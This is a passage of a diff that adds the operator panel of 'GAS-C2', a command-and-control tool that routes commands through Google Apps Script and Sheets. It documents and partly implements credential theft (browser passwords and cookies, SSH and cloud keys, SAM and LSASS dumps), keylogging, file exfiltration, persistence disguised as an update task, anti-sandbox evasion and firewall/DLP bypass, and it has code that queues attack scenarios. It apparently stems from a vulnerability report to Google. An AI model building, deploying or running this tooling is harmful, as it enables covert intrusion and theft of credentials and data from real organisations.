+          <tr><td style="padding:3px 8px; color:var(--success); width:200px;"><code>set-interval &lt;sec&gt;</code></td><td style="padding:3px 8px; color:var(--muted);">Changes the agent's polling interval (effective immediately after the next cycle).</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>set-jitter &lt;sec&gt;</code></td><td style="padding:3px 8px; color:var(--muted);">Changes the random jitter added to each poll.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>set-c2 &lt;url&gt;</code></td><td style="padding:3px 8px; color:var(--muted);">Redirects the agent to a different C2 URL (failover, rotation).</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>agent-info</code></td><td style="padding:3px 8px; color:var(--muted);">Agent's current configuration: interval, jitter, C2 URL, uptime, active jobs, keylogger/clipboard status, loaded modules, current directory.</td></tr>
+        </table>
+
+        <p style="color:var(--accent); font-size:11px; margin:12px 0 4px;">Credential exfiltration</p>
+        <table style="width:100%; border-collapse:collapse; font-size:11px;">
+          <tr><td style="padding:3px 8px; color:var(--success); width:200px;"><code>browser-creds</code></td><td style="padding:3px 8px; color:var(--muted);">Copies Chrome/Edge/Brave Login Data SQLite + Local State (contains DPAPI-encrypted AES key). Upload both; decrypt offline: <code>python3 decrypt_chrome_passwords.py</code>.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>browser-cookies</code></td><td style="padding:3px 8px; color:var(--muted);">Copies Chrome/Edge/Brave Cookies SQLite from all profiles. Session cookies for Google, O365, etc. Decrypt with Local State key.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>ssh-keys</code></td><td style="padding:3px 8px; color:var(--muted);">Searches %USERPROFILE%\.ssh and all user profiles for SSH private keys (id_rsa, id_ed25519, id_ecdsa, *.pem, *.ppk).</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>cloud-keys</code></td><td style="padding:3px 8px; color:var(--muted);">AWS (~/.aws/credentials), Azure (~/.azure/), GCP (~/.config/gcloud), Docker (~/.docker/config.json), Kubernetes (~/.kube/config), plus environment variables matching key/token/secret patterns.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>sam-dump</code></td><td style="padding:3px 8px; color:var(--muted);"><strong style="color:var(--danger);">Admin required.</strong> Exports SAM + SYSTEM registry hives. Extract NTLM hashes offline: <code>impacket-secretsdump -sam sam.hive -system system.hive LOCAL</code>.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>lsass-dump</code></td><td style="padding:3px 8px; color:var(--muted);"><strong style="color:var(--danger);">Admin required.</strong> MiniDump via comsvcs.dll (no external tools). Parse: <code>pypykatz lsa minidump lsass.dmp</code> or mimikatz <code>sekurlsa::minidump</code>.</td></tr>
+        </table>
+
+        <p style="color:var(--accent); font-size:11px; margin:12px 0 4px;">Document &amp; code discovery</p>
+        <table style="width:100%; border-collapse:collapse; font-size:11px;">
+          <tr><td style="padding:3px 8px; color:var(--success); width:200px;"><code>find-docs [ext] [path]</code></td><td style="padding:3px 8px; color:var(--muted);">Finds documents recursively. No args = all Office/PDF in %USERPROFILE%. <code>find-docs xlsx</code> = only .xlsx. <code>find-docs pdf C:\Company</code> = PDFs under C:\Company.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>find-code [path]</code></td><td style="padding:3px 8px; color:var(--muted);">Finds source code files (.py .js .cs .go .php .rb .env .yaml…) and Git repositories. Lists file sizes and modification dates.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>find-secrets [path]</code></td><td style="padding:3px 8px; color:var(--muted);">Greps config/code files for credential patterns: password=, api_key=, AWS AKIA keys, OpenAI sk- keys, GitHub tokens, MongoDB URIs, database connection strings.</td></tr>
+        </table>
+
+        <p style="color:var(--accent); font-size:11px; margin:12px 0 4px;">Network &amp; AD reconnaissance</p>
+        <table style="width:100%; border-collapse:collapse; font-size:11px;">
+          <tr><td style="padding:3px 8px; color:var(--success); width:200px;"><code>dns-cache</code></td><td style="padding:3px 8px; color:var(--muted);">DNS resolver cache (ipconfig /displaydns) — reveals internal hostnames the machine recently resolved.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>shares</code></td><td style="padding:3px 8px; color:var(--muted);">Local and SMB network shares (net share + Get-SmbShare).</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>domain-info</code></td><td style="padding:3px 8px; color:var(--muted);">Active Directory domain name, PDC, forest, domain functional level, all domain controllers.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>ldap-users</code></td><td style="padding:3px 8px; color:var(--muted);">All AD users via LDAP (samAccountName, displayName, email, enabled/disabled status).</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>ldap-groups</code></td><td style="padding:3px 8px; color:var(--muted);">All AD groups with member count.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>rdp-sessions</code></td><td style="padding:3px 8px; color:var(--muted);">Active logon sessions (query session + Win32_LogonSession WMI).</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>firewall</code></td><td style="padding:3px 8px; color:var(--muted);">All enabled Windows Firewall rules (DisplayName, Direction, Action, Profile).</td></tr>
+        </table>
+
+        <p style="color:var(--accent); font-size:11px; margin:12px 0 4px;">Persistence &amp; agent control</p>
+        <table style="width:100%; border-collapse:collapse; font-size:11px;">
+          <tr><td style="padding:3px 8px; color:var(--success); width:200px;"><code>persist</code></td><td style="padding:3px 8px; color:var(--muted);">Installs Scheduled Task (WinUpdateSvc, AtLogon trigger) + HKCU Run key. Agent survives reboots.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>unpersist</code></td><td style="padding:3px 8px; color:var(--muted);">Removes the Scheduled Task and Run key.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>kill &lt;pid&gt;</code></td><td style="padding:3px 8px; color:var(--muted);">Terminates a process by PID.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>sleep &lt;sec&gt;</code></td><td style="padding:3px 8px; color:var(--muted);">Agent sleeps N seconds (blocks the main loop).</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>kill-agent</code></td><td style="padding:3px 8px; color:var(--muted);">Stops the agent remotely (exits the loop, stops keylogger and clipboard watcher). Agent exits silently.</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);"><code>selfdel</code></td><td style="padding:3px 8px; color:var(--muted);">Deletes the agent file from disk after 3 seconds (via cmd.exe ping delay).</td></tr>
+        </table>
+
+        <!-- ── XOR encryption ── -->
+        <h3 style="color:var(--warning); margin:18px 0 8px; font-size:13px; border-bottom:1px solid var(--border); padding-bottom:4px;">XOR encryption &amp; obfuscation</h3>
+        <p style="color:var(--muted);">All commands and outputs are <strong style="color:var(--text);">XOR-encrypted + Base64</strong> before being stored in Google Sheets. Google cannot see the plaintext.</p>
+        <div style="background:var(--bg); border:1px solid var(--border); border-radius:4px; padding:10px 14px; margin:8px 0; font-size:11px; color:var(--muted); line-height:1.8;">
+          <span style="color:var(--success);">Key:</span> configurable via <code>-XorKey</code> (agent) and <code>XOR_KEY</code> constant (panel JS)<br>
+          <span style="color:var(--success);">Flow:</span> Panel XOR-encrypts command → GAS stores encrypted → Agent decrypts → executes → XOR-encrypts output → GAS stores encrypted → Panel decrypts on display
+        </div>
+
+        <!-- ── Anti-sandbox ── -->
+        <h3 style="color:var(--warning); margin:18px 0 8px; font-size:13px; border-bottom:1px solid var(--border); padding-bottom:4px;">Anti-sandbox</h3>
+        <p style="color:var(--muted);">The agent checks at startup whether it is running in an analysis environment. If a sandbox is detected, it silently exits with <code>exit 0</code>.</p>
+        <table style="width:100%; border-collapse:collapse; font-size:11px;">
+          <tr><td style="padding:3px 8px; color:var(--success); width:180px;">Running processes &lt; 28</td><td style="padding:3px 8px; color:var(--muted);">Sandboxes have few running processes</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);">Suspicious hostname</td><td style="padding:3px 8px; color:var(--muted);">sandbox, malware, virus, cuckoo, anyrun, hybrid, analysis, vmware</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);">Uptime &lt; 4 minutes</td><td style="padding:3px 8px; color:var(--muted);">Sandboxes boot the machine only for scanning</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);">Suspicious username</td><td style="padding:3px 8px; color:var(--muted);">sandbox, malware, virus, cuckoo, tester, vmuser</td></tr>
+        </table>
+
+        <!-- ── Why it bypasses enterprise security ── -->
+        <h3 style="color:var(--warning); margin:18px 0 8px; font-size:13px; border-bottom:1px solid var(--border); padding-bottom:4px;">Why it bypasses enterprise security</h3>
+        <table style="width:100%; border-collapse:collapse; font-size:11px;">
+          <tr style="color:var(--muted); border-bottom:1px solid var(--border);">
+            <th style="text-align:left; padding:5px 8px; font-size:10px; text-transform:uppercase;">Control</th>
+            <th style="text-align:left; padding:5px 8px; font-size:10px; text-transform:uppercase;">Status</th>
+            <th style="text-align:left; padding:5px 8px; font-size:10px; text-transform:uppercase;">Reason</th>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:5px 8px; color:var(--text);">Enterprise firewall</td>
+            <td style="padding:5px 8px; color:var(--danger);">BYPASSED</td>
+            <td style="padding:5px 8px; color:var(--muted);">script.google.com is universally allowlisted</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:5px 8px; color:var(--text);">Proxy / SSL inspection</td>
+            <td style="padding:5px 8px; color:var(--danger);">BYPASSED</td>
+            <td style="padding:5px 8px; color:var(--muted);">Standard HTTPS to Google, certificate-pinned</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:5px 8px; color:var(--text);">DLP solutions</td>
+            <td style="padding:5px 8px; color:var(--danger);">BYPASSED</td>
+            <td style="padding:5px 8px; color:var(--muted);">XOR-encrypted data, trusted Google domain</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:5px 8px; color:var(--text);">Threat intel blocklists</td>
+            <td style="padding:5px 8px; color:var(--danger);">BYPASSED</td>
+            <td style="padding:5px 8px; color:var(--muted);">Zero owned infrastructure (no attacker IPs or domains)</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:5px 8px; color:var(--text);">EDR network rules</td>
+            <td style="padding:5px 8px; color:var(--danger);">BYPASSED</td>
+            <td style="padding:5px 8px; color:var(--muted);">Google traffic is typically excluded from inspection</td>
+          </tr>
+          <tr style="border-bottom:1px solid var(--border);">
+            <td style="padding:5px 8px; color:var(--text);">Attacker attribution</td>
+            <td style="padding:5px 8px; color:var(--danger);">EVADED</td>
+            <td style="padding:5px 8px; color:var(--muted);">Attacker has no owned infrastructure</td>
+          </tr>
+          <tr>
+            <td style="padding:5px 8px; color:var(--text);">User-Agent / headers</td>
+            <td style="padding:5px 8px; color:var(--danger);">SPOOFED</td>
+            <td style="padding:5px 8px; color:var(--muted);">Chrome 123 UA + Referer: docs.google.com — traffic looks like a normal browser</td>
+          </tr>
+        </table>
+
+        <!-- ── Suggested mitigations ── -->
+        <h3 style="color:var(--warning); margin:18px 0 8px; font-size:13px; border-bottom:1px solid var(--border); padding-bottom:4px;">Suggested mitigations for Google</h3>
+        <table style="width:100%; border-collapse:collapse; font-size:11px;">
+          <tr><td style="padding:3px 8px; color:var(--success); width:220px;">Mandatory authentication</td><td style="padding:3px 8px; color:var(--muted);">Remove the "Anyone" option for Web Apps — require at minimum Google Sign-In</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);">Rate limiting</td><td style="padding:3px 8px; color:var(--muted);">Limit requests per account / per hour on public Web Apps</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);">Sandbox UrlFetchApp</td><td style="padding:3px 8px; color:var(--muted);">Restrict outbound requests from public Web Apps (SSRF vector)</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);">Anomaly detection</td><td style="padding:3px 8px; color:var(--muted);">Flag accounts with high-volume automated Web App requests</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);">CORS enforcement</td><td style="padding:3px 8px; color:var(--muted);">Restrict Access-Control-Allow-Origin on GAS responses</td></tr>
+          <tr><td style="padding:3px 8px; color:var(--success);">Audit logging</td><td style="padding:3px 8px; color:var(--muted);">Log all Web App invocations with caller metadata</td></tr>
+        </table>
+
+        <p style="color:var(--border); font-size:10px; margin-top:24px; text-align:center;">GAS-C2 v1.1.0</p>
+      </div>
+    </div>
+  </main>
+</div>
+
+<!-- Output modal -->
+<div class="modal-overlay" id="modal-overlay" onclick="closeModal()">
+  <div class="modal" onclick="event.stopPropagation()">
+    <h3 id="modal-title">Output</h3>
+    <pre id="modal-body"></pre>
+    <button class="modal-close" onclick="closeModal()">Close</button>
+  </div>
+</div>
+
+<script>
+// ── State ──────────────────────────────────────────────────────────────────────
+let C2_URL     = "";
+let C2_TOKEN   = "gas-c2-vrp-2026";
+const XOR_KEY  = "GAS_VRP_2026_K";  // Must match agent.ps1 -XorKey and Code.gs
+
+let cmdCounter   = Date.now();
+let pollInterval = null;
+let resultsInterval = null;
+let knownCmdIds  = new Set();    // deduplicate live results
+let allResults   = [];           // for JSON export
+let cmdHistory   = [];           // command history (arrow up/down)
+let cmdHistoryIdx = -1;
+let xferChunks   = {};           // chunk reassembly: xferId → {total, chunks, filename}
+
+// ── XOR Crypto ────────────────────────────────────────────────────────────────
+
+function xorB64(text, key) {
+  const tb  = new TextEncoder().encode(text);
+  const kb  = new TextEncoder().encode(key);
+  const out = tb.map((b, i) => b ^ kb[i % kb.length]);
+  return btoa(String.fromCharCode(...out));
+}
+
+function xorDecB64(b64, key) {
+  try {
+    const bytes = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
+    const kb    = new TextEncoder().encode(key);
+    const out   = bytes.map((b, i) => b ^ kb[i % kb.length]);
+    return new TextDecoder().decode(out);
+  } catch (_) {
+    return b64; // not encrypted — return as-is (backward compat)
+  }
+}
+
+// ── Connection ────────────────────────────────────────────────────────────────
+
+async function connect() {
+  const url   = document.getElementById("c2-url").value.trim();
+  const token = document.getElementById("c2-token").value.trim();
+  if (!url) return termError("Please enter a C2 URL");
+
+  C2_URL   = url;
+  C2_TOKEN = token;
+  document.getElementById("c2-url-display").textContent = url;
+
+  termInfo(`Connecting to ${url} ...`);
+
+  try {
+    const status = await apiFetch(apiUrl("status"));
+    updateStats(status);
+    document.getElementById("status-dot").className = "status-dot online";
+    termSuccess(`Connected — C2 online (v${status.version})`);
+
+    await refreshAgents();
+    startAutoRefresh();
+  } catch (e) {
+    document.getElementById("status-dot").className = "status-dot";
+    termError(`Connection failed: ${e.message}`);
+  }
+}
+
+function apiUrl(action, extra) {
+  const p = new URLSearchParams({ action, token: C2_TOKEN, ...(extra || {}) });
+  return `${C2_URL}?${p}`;
+}
+
+function startAutoRefresh() {
+  if (pollInterval)   clearInterval(pollInterval);
+  if (resultsInterval) clearInterval(resultsInterval);
+
+  // Status + agents every 10s
+  pollInterval = setInterval(async () => {
+    try {
+      const s = await apiFetch(apiUrl("status"));
+      updateStats(s);
+    } catch (_) {}
+    try { await refreshAgents(true); } catch (_) {}
+  }, 10000);
+
+  // Live results every 5s
+  resultsInterval = setInterval(fetchResults, 5000);
+}
+
+// ── Commands ──────────────────────────────────────────────────────────────────
+
+async function sendCommand() {
+  const input   = document.getElementById("cmd-input");
+  const command = input.value.trim();
+  if (!command || !C2_URL) { termError("Not connected or empty command"); return; }
+
+  // Handle built-in panel commands
+  if (command === "clear") { input.value = ""; clearTerminal(); return; }
+
+  // Save to history (avoid duplicates at top)
+  if (cmdHistory[0] !== command) cmdHistory.unshift(command);
+  if (cmdHistory.length > 100) cmdHistory.pop();
+  cmdHistoryIdx = -1;
+  input.value = "";
+
+  const target = document.getElementById("target-select").value;
+  const cmdId  = ++cmdCounter;
+
+  termPrompt(target, command);
+
+  const encrypted = xorB64(command, XOR_KEY);
+
+  try {
+    await apiFetch(apiUrl("queue", { cmd_id: cmdId, target, command: encrypted }));
+    termInfo(`cmd_id=${cmdId} queued — waiting for agent (poll interval ~8s)`);
+  } catch (e) {
+    termError(`Failed to queue: ${e.message}`);
+  }
+}
+
+// ── Results ───────────────────────────────────────────────────────────────────
+
+async function fetchResults() {
+  if (!C2_URL) return;
+  try {
+    const data = await apiFetch(apiUrl("results", { limit: 100 }));
+    if (!data.results) return;
+
+    let newCount = 0;
+    for (const r of data.results) {
+      if (knownCmdIds.has(r.cmd_id)) continue;
+      knownCmdIds.add(r.cmd_id);
+      allResults.push(r);
+      newCount++;
+
+      const output = xorDecB64(r.output, XOR_KEY);
+      const ts     = new Date(r.timestamp).toLocaleTimeString();
+      const agent  = r.agent_id.slice(0, 8);
+
+      // ── Special result types ───────────────────────────────────────────────
+
+      // Background job result
+      if (r.cmd_id.startsWith("bg-")) {
+        termSuccess(`[${ts}] Background job result (${r.cmd_id}) from ${agent}...:`);
+        termOutput(output);
+        addResultRow(r, output);
+        continue;
+      }
+
+      // Keylogger auto-exfil
+      if (r.cmd_id.startsWith("keylog-auto")) {
+        termInfo(`[${ts}] Keylogger auto-exfil from ${agent}... (${output.length} chars)`);
+        addResultRow(r, output);
+        continue;
+      }
+
+      // Chunked file transfer
+      if (r.cmd_id.startsWith("XFER-") || output.startsWith("CHUNK:")) {
+        handleChunkResult(r, output);
+        continue;
+      }
+
+      // Single-chunk file (small files)
+      if (output.startsWith("FILE_B64:")) {
+        const parts  = output.split(":");
+        const fname  = parts[1];
+        const b64    = parts.slice(2).join(":");
+        termSuccess(`[${ts}] File received from ${agent}...: ${fname} (${b64.length} b64 chars)`);
+        offerDownload(fname, b64);
+        addResultRow(r, `[FILE: ${fname}]`);
+        continue;
+      }
+
+      // Screenshot
+      if (output.startsWith("SCREENSHOT_B64:")) {
+        const b64 = output.slice("SCREENSHOT_B64:".length);
+        termSuccess(`[${ts}] Screenshot from ${agent}...:`);
+        const img = document.createElement("img");
+        img.src   = "data:image/png;base64," + b64;
+        img.style = "max-width:100%; border:1px solid var(--border); border-radius:4px; margin-top:4px; cursor:pointer;";
+        img.onclick = () => window.open(img.src, "_blank");
+        const t = document.getElementById("terminal");
+        const wrap = document.createElement("div");
+        wrap.className = "term-line";
+        wrap.appendChild(img);
+        t.appendChild(wrap);
+        t.scrollTop = t.scrollHeight;
+        addResultRow(r, "[SCREENSHOT — click to expand in table]");
+        continue;
+      }
+
+      // Normal result
+      termSuccess(`[${ts}] Result from ${agent}... (cmd ${r.cmd_id}):`);
+      termOutput(output);
+      addResultRow(r, output);
+    }
+
+    if (newCount > 0) {
+      termInfo(`${newCount} new result(s) received`);
+    }
+  } catch (_) {}
+}
+
+function addResultRow(r, decryptedOutput) {
+  const tbody = document.getElementById("results-body");
+
+  // Remove "no results" placeholder
+  const placeholder = tbody.querySelector("td[colspan]");
+  if (placeholder) placeholder.parentElement.remove();
+
+  const tr = document.createElement("tr");
+  const ts = new Date(r.timestamp).toLocaleString();
+  tr.innerHTML = `
+    <td style="white-space:nowrap; color:var(--muted);">${esc(ts)}</td>
+    <td style="color:var(--accent); max-width:120px; overflow:hidden; text-overflow:ellipsis;">${esc(r.agent_id.slice(0,12))}…</td>
+    <td style="color:var(--muted);">${esc(r.cmd_id)}</td>
+    <td class="output" title="Click to expand" onclick="showModal('Output — cmd ${esc(r.cmd_id)}', ${JSON.stringify(decryptedOutput)})">${esc(decryptedOutput.slice(0, 80))}${decryptedOutput.length > 80 ? '…' : ''}</td>
+  `;
+  tbody.appendChild(tr);
+}
+
+function clearResultsTable() {
+  document.getElementById("results-body").innerHTML =
+    '<tr><td colspan="4" style="color:var(--muted); text-align:center; padding:20px;">No results yet</td></tr>';
+  knownCmdIds.clear();
+  allResults = [];
+}
+
+// ── Full Reset ────────────────────────────────────────────────────────────────
+
+async function fullReset() {
+  if (!C2_URL) { termError("Not connected — connect first"); return; }
+
+  const first = confirm("⚠ FULL RESET\n\nThis will permanently delete ALL data from the Google Sheet:\n  • Agents\n  • Commands\n  • Results\n  • Logs\n\nConnected agents will lose their registration and any pending commands.\n\nContinue?");
+  if (!first) return;
+
+  const second = confirm("Are you sure? This cannot be undone.");
+  if (!second) return;
+
+  termInfo("[RESET] Wiping all Sheet data...");
+
+  try {
+    const data = await apiFetch(apiUrl("reset"));
+
+    if (data.status !== "reset_ok") {
+      termError(`[RESET] Server error: ${JSON.stringify(data)}`);
+      return;
+    }
+
+    // Clear local panel state
+    knownCmdIds.clear();
+    allResults   = [];
+    xferChunks   = {};
+    cmdHistory   = [];
+    cmdHistoryIdx = -1;
+
+    // Clear results table
+    clearResultsTable();
+
+    // Clear agent list + selector
+    document.getElementById("agent-list").innerHTML = "";
+    const sel = document.getElementById("target-select");
+    sel.innerHTML = '<option value="*">* (broadcast all)</option>';
+    document.getElementById("agent-count").textContent = "0";
+
+    // Clear terminal
+    clearTerminal();
+
+    // Update stats
+    updateStats({ agents: 0, commands: 0, results: 0 });
+
+    const details = Object.entries(data.deleted)
+      .map(([sheet, n]) => `${sheet}: ${n} row(s) deleted`)
+      .join(" · ");
+
+    termSuccess(`[RESET] Fresh start — ${details}`);
+
+  } catch (e) {
+    termError(`[RESET] Failed: ${e.message}`);
+  }
+}
+
+// ── Chunked File Transfer ─────────────────────────────────────────────────────
+
+function handleChunkResult(r, decrypted) {
+  // Format: CHUNK:xferId:idx/total:filename:data
+  if (!decrypted.startsWith("CHUNK:")) {
+    termInfo(`(XFER result received: ${r.cmd_id})`);
+    return;
+  }
+  const firstColon = "CHUNK:".length;
+  const parts = decrypted.split(":");
+  // parts[0]="CHUNK", parts[1]=xferId, parts[2]="idx/total", parts[3]=fname, parts[4..]=data
+  if (parts.length < 5) return;
+
+  const xferId = parts[1];
+  const [idxStr, totalStr] = parts[2].split("/");
+  const idx    = parseInt(idxStr);
+  const total  = parseInt(totalStr);
+  const fname  = parts[3];
+  const data   = parts.slice(4).join(":");
+
+  if (!xferChunks[xferId]) {
+    xferChunks[xferId] = { total, chunks: {}, filename: fname, received: 0 };
+    termInfo(`Receiving ${esc(fname)} — ${total} chunk(s) expected (id: ${xferId})`);
+  }
+
+  xferChunks[xferId].chunks[idx] = data;
+  xferChunks[xferId].received++;
+
+  const rx = xferChunks[xferId].received;
+  if (rx % 5 === 0 || rx === total) {
+    termInfo(`${esc(fname)}: ${rx}/${total} chunks received`);
+  }
+
+  if (rx >= total) {
+    let assembled = "";
+    for (let i = 0; i < total; i++) {
+      assembled += (xferChunks[xferId].chunks[i] || "");
+    }
+    delete xferChunks[xferId];
+    termSuccess(`${esc(fname)} fully received — starting download`);
+    offerDownload(fname, assembled);
+  }
+}
+
+function offerDownload(fname, b64data) {
+  try {
+    const raw   = atob(b64data);
+    const bytes = Uint8Array.from(raw, c => c.charCodeAt(0));
+    const blob  = new Blob([bytes]);
+    const url   = URL.createObjectURL(blob);
+    const a     = document.createElement("a");
+    a.href      = url;
+    a.download  = fname;
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+  } catch (e) {
+    termError(`Download failed: ${e.message}`);
+  }
+}
+
+function exportJSON() {
+  if (!allResults.length) { termError("No results to export"); return; }
+
+  const decrypted = allResults.map(r => ({
+    ...r,
+    output: xorDecB64(r.output, XOR_KEY),
+  }));
+  const blob = new Blob([JSON.stringify(decrypted, null, 2)], { type: "application/json" });
+  const a    = document.createElement("a");
+  a.href     = URL.createObjectURL(blob);
+  a.download = `gas-c2-results-${Date.now()}.json`;
+  a.click();
+  termSuccess(`Exported ${decrypted.length} results`);
+}
+
+// ── Agents ────────────────────────────────────────────────────────────────────
+
+async function refreshAgents(silent) {
+  if (!C2_URL) return;
+  if (!silent) termInfo("Refreshing agent list...");
+  try {
+    const data = await apiFetch(apiUrl("agents"));
+    if (!data.agents) return;
+
+    const list    = document.getElementById("agent-list");
+    const select  = document.getElementById("target-select");
+    const count   = document.getElementById("agent-count");
+
+    list.innerHTML = "";
+    // Reset select, keep broadcast option
+    select.innerHTML = '<option value="*">* (broadcast all)</option>';
+    count.textContent = data.agents.length;
+
+    for (const a of data.agents) {
+      if (!a.agent_id || a.agent_id.trim() === "") continue; // skip ghost rows
+      const active = a.status === "active";
+      const dot    = active ? "dot-active" : "dot-inactive";
+      const dotCh  = active ? "●" : "○";
+
+      const div = document.createElement("div");
+      div.className = "agent-item";
+      div.innerHTML = `
+        <div class="agent-id"><span class="${dot}">${dotCh}</span> ${esc(a.agent_id.slice(0,12))}…</div>
+        <div class="agent-meta">${esc(a.host || "?")}  ${esc(a.user || "")}</div>
+        <div class="agent-meta" style="color:var(--muted);">${esc(a.ip || "")}  ${esc((a.os||"").slice(0,30))}</div>
+        <div class="agent-seen">${esc(a.last_seen ? new Date(a.last_seen).toLocaleString() : "")}</div>
+      `;
+      div.onclick = () => {
+        document.querySelectorAll(".agent-item").forEach(el => el.classList.remove("selected"));
+        div.classList.add("selected");
+        select.value = a.agent_id;
+        if (!select.querySelector(`option[value="${CSS.escape(a.agent_id)}"]`)) {
+          // handled below
+        }
+        termInfo(`Target set → ${a.agent_id}`);
+      };
+      list.appendChild(div);
+
+      const opt = document.createElement("option");
+      opt.value = a.agent_id;
+      opt.textContent = `${a.agent_id.slice(0,8)}… (${a.host || "?"})`;
+      select.appendChild(opt);
+    }
+
+    if (!silent) termSuccess(`${data.agents.length} agent(s) loaded`);
+  } catch (e) {
+    if (!silent) termError(`refreshAgents: ${e.message}`);
+  }
+}
+
+// ── Stats ─────────────────────────────────────────────────────────────────────
+
+function updateStats(s) {
+  document.getElementById("stat-agents").textContent   = s.agents   ?? "—";
+  document.getElementById("stat-commands").textContent = s.commands ?? "—";
+  document.getElementById("stat-results").textContent  = s.results  ?? "—";
+  document.getElementById("stat-time").textContent     = new Date().toLocaleTimeString();
+}
+
+// ── Terminal ──────────────────────────────────────────────────────────────────
+
+function termPrompt(target, cmd) {
+  const ts = new Date().toLocaleTimeString();
+  term(`<span class="term-muted">[${ts}]</span> <span class="term-prompt">[${esc(target)}] $ </span><span class="term-output">${esc(cmd)}</span>`);
+}
+function termOutput(txt) { term(`<span class="term-output">${esc(txt)}</span>`); }
+function termError(txt)  { term(`<span class="term-error">ERROR: ${esc(txt)}</span>`); }
+function termInfo(txt)   { term(`<span class="term-info">// ${esc(txt)}</span>`); }
+function termSuccess(txt){ term(`<span class="term-success">✓ ${esc(txt)}</span>`); }
+
+function term(html) {
+  const t    = document.getElementById("terminal");
+  const line = document.createElement("div");
+  line.className = "term-line";
+  line.innerHTML = html;
+  t.appendChild(line);
+  t.scrollTop = t.scrollHeight;
+}
+
+function clearTerminal() {
+  document.getElementById("terminal").innerHTML =
+    '<div class="term-line term-info">// Terminal cleared</div>';
+}
+
+function esc(s) {
+  return String(s)
+    .replace(/&/g,"&amp;")
+    .replace(/</g,"&lt;")
+    .replace(/>/g,"&gt;");
+}
+
+// ── Scenarios ─────────────────────────────────────────────────────────────────
+
+const SCENARIOS = {
+  creds: [
+    "whoami", "sysinfo", "av",
+    "creds", "wifi", "history", "cloud-keys", "ssh-keys",
+    "browser-creds", "browser-cookies", "env",
+  ],
+  recon: [
+    "whoami", "sysinfo",
+    "ipconfig", "netstat", "arp", "route", "dns-cache",
+    "shares", "domain-info", "ldap-users", "ldap-groups",
+    "rdp-sessions", "firewall",
+    "ps", "tasks", "users", "groups",
+    "keylog start", "screenshot",
+  ],
+  exfil: [ "find-docs", "find-code", "find-secrets" ],
+  persist: [ "persist", "keylog start", "clip-watch start", "screenshot", "ldap-users", "shares" ],
+};
+SCENARIOS["full-apt"] = [...SCENARIOS.creds, ...SCENARIOS.recon, ...SCENARIOS.exfil, ...SCENARIOS.persist];
+
+async function runScenario(name) {
+  if (!C2_URL) { termError("Not connected — connect first"); return; }
+  const cmds = SCENARIOS[name];
+  if (!cmds) { termError("Unknown scenario: " + name); return; }
+
+  const target = document.getElementById("target-select").value;
+  termInfo(`[SCENARIO:${name}] Queuing ${cmds.length} commands to ${esc(target)}`);
+  switchTab("terminal");
+
+  let ok = 0;
+  for (const cmd of cmds) {
+    const cmdId = ++cmdCounter;
+    const enc   = xorB64(cmd, XOR_KEY);
+    try {
+      await apiFetch(apiUrl("queue", { cmd_id: cmdId, target, command: enc }));
+      ok++;
+    } catch (e) {
+      termError(`Failed to queue '${esc(cmd)}': ${e.message}`);
+    }
+    await new Promise(r => setTimeout(r, 350));
+  }
+  termSuccess(`[SCENARIO:${name}] ${ok}/${cmds.length} commands queued — results will appear below as agents respond`);
+}
+
+// ── Tabs ──────────────────────────────────────────────────────────────────────
+
+function switchTab(name) {
+  document.querySelectorAll(".tab-content").forEach(el => el.classList.remove("active"));
+  document.querySelectorAll(".tab").forEach(el => el.classList.remove("active"));
+  document.getElementById(`tab-${name}`).classList.add("active");
+  event.target.classList.add("active");
+}
+
+// ── Modal ─────────────────────────────────────────────────────────────────────
+
+function showModal(title, content) {
+  document.getElementById("modal-title").textContent = title;
+  document.getElementById("modal-body").textContent  = content;
+  document.getElementById("modal-overlay").classList.add("open");
+}
+function closeModal() {
+  document.getElementById("modal-overlay").classList.remove("open");
+}
+
+// ── API ───────────────────────────────────────────────────────────────────────
+
+async function apiFetch(url) {
+  const res = await fetch(url);
+  if (!res.ok) throw new Error(`HTTP ${res.status}`);
+  return res.json();
+}
+
+// ── Keyboard shortcuts ────────────────────────────────────────────────────────
+document.addEventListener("keydown", e => {
+  if (e.key === "Escape") { closeModal(); return; }
+
+  const input = document.getElementById("cmd-input");
+  if (document.activeElement !== input) return;
+
+  if (e.key === "ArrowUp") {
+    e.preventDefault();
+    if (cmdHistory.length === 0) return;
+    cmdHistoryIdx = Math.min(cmdHistoryIdx + 1, cmdHistory.length - 1);
